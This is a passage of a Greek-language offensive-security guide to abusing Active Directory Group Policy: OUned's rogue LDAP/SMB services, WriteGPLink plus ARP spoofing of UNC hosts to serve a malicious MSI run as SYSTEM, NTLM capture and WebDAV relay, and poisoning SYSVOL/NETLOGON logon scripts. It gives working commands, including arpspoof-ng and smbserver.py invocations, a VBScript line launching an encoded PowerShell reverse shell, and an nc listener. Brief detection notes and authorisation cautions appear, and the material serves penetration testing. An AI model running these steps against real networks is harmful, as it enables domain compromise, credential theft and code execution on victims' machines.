[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Το θύμα αυθεντικοποιείται πρώτα στην κακόβουλη υπηρεσία LDAP και λαμβάνει ένα GPC του οποίου το `gPCFileSysPath` παραπέμπει στην κακόβουλη υπηρεσία SMB· έπειτα αυθεντικοποιείται στο SMB και εφαρμόζει το παρεχόμενο GPT. Επομένως, το OUned χρειάζεται έναν λογαριασμό με LDAP SPN, έναν λογαριασμό υπολογιστή με HOST SPN για το SMB (ο ίδιος λογαριασμός υπολογιστή μπορεί να καλύψει και τις δύο απαιτήσεις) και επίλυση DNS ή αντίστροφη προώθηση που κατευθύνει τις θύρες 389 και 445 στον host του operator.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

Το ενσωματωμένο Scapy LDAP server του OUned επικυρώνει Kerberos/SPNEGO με το πραγματικό ελεγχόμενο service key και παρέχει αυθαίρετα δεδομένα GPC από JSON. Το κενό κλειδί JSON αναπαριστά το rootDSE, τα προθέματα `base64:` αναπαριστούν δυαδικές τιμές και ο server υποστηρίζει add/delete/modify/search, καθώς και αναζητήσεις `BASE`, `LEVEL` και `SUBTREE`. Μπορεί να διαπραγματευτεί χωρίς προστασία, με ακεραιότητα ή με εμπιστευτικότητα. Έτσι, η υπηρεσία μπορεί να επαναχρησιμοποιηθεί όταν κάποιο άλλο στοιχείο των Windows ακολουθεί μια αναφορά LDAP που ελέγχεται από attacker, αλλά απαιτεί αυθεντικοποιημένο LDAP.<sup>[[15]](#references)</sup>

Μην υποθέτετε ότι ο συγχρονισμός του password ενός λογαριασμού σε dummy domain αναπαράγει όλα τα Kerberos keys: το RC4 παράγεται από το password, ενώ το AES string-to-key χρησιμοποιεί επίσης salt που προκύπτει από το hostname/domain του principal. Η παροχή του πραγματικού AES key του λογαριασμού στο `KerberosSSP` αποφεύγει την επιβολή χρήσης RC4 μέσω μιας ανιχνεύσιμης αλλαγής στο `msDS-SupportedEncryptionTypes` του machine account, το οποίο μπορεί να τροποποιήσει ο ίδιος.<sup>[[15]](#references)</sup>

#### Σημεία ανίχνευσης

Συσχετίστε αλλαγές στα `gPCFileSysPath` ή `gPLink` με αλλαγές στην έκδοση GPO και νέα XML Immediate/Scheduled Task. Διερευνήστε συνδέσμους προς απρόσμενα naming contexts, UNC hosts εκτός του εγκεκριμένου συνόλου DC/SYSVOL, εγγραφές DNS που ανακατευθύνουν ονόματα machine account, LDAP/CIFS service tickets για ασυνήθιστα machine accounts και αλλαγές στο `msDS-SupportedEncryptionTypes` που ενεργοποιούν το RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Το `WriteGPLink` σε OU/domain σάς επιτρέπει να τροποποιήσετε το attribute `gPLink` του target container και να **επιβάλετε την εφαρμογή ενός υπάρχοντος GPO** χωρίς να επεξεργαστείτε το ίδιο το GPO. Αυτό αποκτά ενδιαφέρον όταν το συνδεδεμένο GPO αναφέρεται ήδη σε απομακρυσμένο περιεχόμενο μέσω **UNC paths** (`\\HOST\share\...`), επειδή οι αυθεντικοποιημένοι χρήστες μπορούν να διαβάσουν το **SYSVOL** και να αναζητήσουν offline πολιτικές που μπορούν να επαναχρησιμοποιηθούν.<sup>[[11]](#references)</sup>

Ροή εργασίας υψηλού επιπέδου:

1. Χρησιμοποιήστε το BloodHound για να εντοπίσετε ένα principal με `WriteGPLink` σε ένα OU και να απαριθμήσετε υπολογιστές/χρήστες μέσα σε αυτό το OU.
2. Κλωνοποιήστε το `SYSVOL` μόνο για ανάγνωση και αναλύστε τα GPO για **Software Installation**, **drive mappings** (`Drives.xml`) και **logon/startup scripts** που αναφέρονται σε UNC paths.
3. Προτιμήστε πολιτικές που δείχνουν σε **άμεσο hostname** (για παράδειγμα `\\DC02\share\pkg.msi`) αντί για paths DFS/domain-namespace, επειδή τα paths που βασίζονται σε hostname ανακατευθύνονται ευκολότερα με L2 spoofing.
4. Προσθέστε το GUID του επιλεγμένου GPO στο `gPLink` του target OU, ώστε το θύμα να επεξεργαστεί αυτήν την ήδη υπάρχουσα πολιτική.
5. Στο ίδιο broadcast domain, κάντε ARP spoofing του UNC host και συνδέστε το IP του τοπικά (`ip addr add <target_ip>/32 dev <iface>`), ώστε η SMB κίνηση του θύματος να φτάνει στο host σας.
6. Παρέχετε το αναμενόμενο path/filename από έναν SMB server ελεγχόμενο από attacker (για παράδειγμα `smbserver.py`) και περιμένετε την κανονική επεξεργασία πολιτικής.

Παράδειγμα συλλογής `SYSVOL` και συσχέτισης GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Συνδέστε το υπάρχον GPO με την OU-στόχο:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### UNC hijack εγκατάστασης λογισμικού -> SYSTEM

Αν το συνδεδεμένο GPO αναπτύσσει ένα MSI από διαδρομή UNC, ο client θα το ανακτήσει κατά την **εκκίνηση του υπολογιστή** και θα το εγκαταστήσει ως **`NT AUTHORITY\SYSTEM`**. Παραποιώντας τον αναφερόμενο host και σερβίροντας ένα κακόβουλο MSI στο **ίδιο share/path/name**, μπορείτε να μετατρέψετε το `WriteGPLink` σε εκτέλεση κώδικα ως SYSTEM **χωρίς να τροποποιήσετε το SYSVOL**.

Σημαντικοί περιορισμοί:

- **Ο χρονισμός έχει σημασία**: ο νέος σύνδεσμος εμφανίζεται κατά την ανανέωση πολιτικής (συνήθως μετά από ~90 λεπτά), αλλά η **Εγκατάσταση λογισμικού** συνήθως ενεργοποιείται κατά την **επανεκκίνηση**.
- Το Windows Installer συνήθως παρακολουθεί την ανάπτυξη χρησιμοποιώντας το **`ProductCode`** του πακέτου. Αν το προϊόν είναι ήδη εγκατεστημένο, η ανάπτυξη μπορεί να παραλειφθεί.
- Για να αποφύγετε την απόρριψη από το πρόγραμμα εγκατάστασης, τροποποιήστε το rogue MSI ώστε τα **`ProductCode`** και **`PackageCode`** του να ταιριάζουν με αυτά του νόμιμου πακέτου που αναμένει το GPO.
- Παλιά αρχεία διαφήμισης `.aas` μπορεί να παραμείνουν στο `SYSVOL`, οπότε επαληθεύστε ότι η ανάπτυξη εξακολουθεί να εμφανίζεται ενεργή πριν βασιστείτε σε αυτή.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Υφαρπαγή UNC drive-map -> σύλληψη NTLM / relay μέσω WebDAV

Οι αντιστοιχίσεις drive του GPP στο `Drives.xml` κάνουν τους χρήστες να πραγματοποιούν authentication στη διαμορφωμένη διαδρομή UNC κατά τη σύνδεση ή την επανασύνδεση. Αν κάνεις spoof τον αναφερόμενο host, μπορείς να συλλάβεις **NetNTLMv2**. Αν προκαλέσεις σκόπιμα αποτυχία του SMB, τα Windows ενδέχεται να ξαναδοκιμάσουν μέσω **WebDAV**, στέλνοντας **NTLM μέσω HTTP**, κάτι που προσφέρει πολύ μεγαλύτερη ευελιξία για relay προς **LDAP(S)**, **AD CS** ή **SMB**.

#### Υφαρπαγή UNC σε logon/startup script

Το ίδιο μοτίβο ισχύει για scripts που φιλοξενούνται σε UNC και εντοπίζονται στο `SYSVOL`:

- Τα **Logon scripts** εκτελούνται συνήθως στο context του **user**.
- Τα **Startup scripts** εκτελούνται συνήθως στο context του **computer / SYSTEM**.

Αν η διαδρομή του script δείχνει σε hostname που μπορείς να κάνεις spoof, ανακατεύθυνε τον UNC host και σέρβιρε περιεχόμενο αντικατάστασης για το script από την αναμενόμενη τοποθεσία.

## Poisoning Logon Script σε SYSVOL/NETLOGON

Οι διαδρομές με δικαίωμα εγγραφής κάτω από `\\<dc>\SYSVOL\<domain>\scripts\` ή `\\<dc>\NETLOGON\` επιτρέπουν την αλλοίωση logon scripts που εκτελούνται κατά τη σύνδεση χρήστη μέσω GPO. Αυτό παρέχει εκτέλεση κώδικα στο security context των χρηστών που συνδέονται.

### Εντοπισμός logon scripts
- Έλεγξε τα attributes των χρηστών για ρυθμισμένο logon script:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Σάρωσε τα domain shares για να εντοπίσεις συντομεύσεις ή αναφορές σε scripts:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Αναλύστε αρχεία `.lnk` για να εντοπίσετε στόχους που παραπέμπουν σε SYSVOL/NETLOGON (χρήσιμο κόλπο DFIR και για attackers χωρίς άμεση πρόσβαση στο GPO):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- Το BloodHound εμφανίζει το attribute `scriptPath` του user object για το logon script, αν υπάρχει. Τα logon scripts που έχουν ρυθμιστεί μέσω GPO είναι ξεχωριστή αναφορά πολιτικής, οπότε ελέγξτε και το εφαρμοστέο GPO.

### Επαληθεύστε την πρόσβαση εγγραφής (μην εμπιστεύεστε τις λίστες των shares)
Τα αυτοματοποιημένα εργαλεία ενδέχεται να εμφανίζουν τα SYSVOL/NETLOGON ως read-only, ακόμα κι όταν το ακριβές script έχει διαφορετικό NTFS ACL. Ξεκινήστε με read-only επιθεώρηση αυτού του αρχείου και του γονικού καταλόγου του· τα αντίστοιχα Allow ACEs παραμένουν υποψήφια, επειδή έχουν σημασία η πραγματική πρόσβαση SMB και NTFS, τα Deny ACEs και το τρέχον token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Ένα εξουσιοδοτημένο write test πρέπει να αφορά συγκεκριμένο στόχο και να είναι αναστρέψιμο, με backup του αρχικού script και επαναφορά του. Μην αντικαθιστάτε ένα λειτουργικό logon script μόνο και μόνο για να δοκιμάσετε την πρόσβαση· μια επιτυχής εγγραφή μπορεί να εκτελεστεί κατά το επόμενο logon χρήστη.

### Poison ένα VBScript logon script για RCE
Προσθέστε μια εντολή που εκκινεί ένα PowerShell reverse shell (δημιουργήστε το από το revshells.com) και διατηρήστε την αρχική λογική για να μην διακοπεί η επιχειρησιακή λειτουργία:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Ακούστε στον host σας και περιμένετε το επόμενο interactive logon:

```bash
rlwrap -cAr nc -lnvp 443
```

Σημειώσεις:
- Η εκτέλεση γίνεται με το token του χρήστη καταγραφής (όχι με SYSTEM). Η εμβέλεια είναι ο σύνδεσμος GPO (OU, τοποθεσία, τομέας) που εφαρμόζει αυτό το script.
- Μετά τη χρήση, επαναφέρετε το αρχικό περιεχόμενο και τις χρονικές σημάνσεις.

## References

- [1] [Κατάχρηση Active Directory ACLs/ACEs](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Προνομιούχοι λογαριασμοί και δικαιώματα token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – Η ενημέρωση για τις διαδρομές επίθεσης ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Κλιμάκωση προνομίων με ACLs στο Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Σάρωση για προνόμια Active Directory και προνομιούχους λογαριασμούς](https://adsecurity.org/?p=3658)
- [7] [Κατασκευαστής ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Λειτουργίες χαρακτηριστικών AD/UAC από Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (συμμετοχή σε ομάδες)](https://www.samba.org/)
- [10] [HTB Puppy: Κατάχρηση AD ACL, cracking Argon2 του KeePassXC και αποκρυπτογράφηση DPAPI έως admin του DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - Γύρω από το ARP και ανακαλύψτε: Υποκλοπή διαδρομών UNC του GPO για εκτέλεση κώδικα και NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: εκμετάλλευση GPO του Active Directory μέσω NTLM relaying και άλλα](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [Η OU κάνει πλάκα; - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: εκμετάλλευση κρυφών διανυσμάτων επίθεσης ACL σε Organizational Units του Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Προσομοίωση νόμιμων υπηρεσιών Active Directory στο δίκτυο: η περίπτωση εκμετάλλευσης GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — Μετακίνηση μεταξύ OU και κατάχρηση κληρονομημένων ACL](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
